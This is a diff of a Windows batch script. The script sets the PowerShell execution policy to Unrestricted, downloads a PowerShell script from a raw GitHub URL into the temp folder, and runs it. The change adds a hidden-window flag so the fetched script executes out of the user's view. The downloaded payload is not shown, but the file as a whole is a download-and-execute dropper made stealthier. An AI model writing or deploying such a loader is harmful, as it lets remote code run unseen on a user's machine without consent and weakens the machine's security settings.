@@ -9,5 +9,5 @@ echo Download and save the Script to the temp folder
 powershell -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser"
 powershell -Command "curl https://raw.githubusercontent.com/d3d0n/funwngrok/main/final.ps1 -OutFile $env:temp\final.ps1"
 echo Run the Script
-powershell -Command "& $env:temp\final.ps1"
+powershell -WindowStyle Hidden -Command "& $env:temp\final.ps1"
 echo Done!
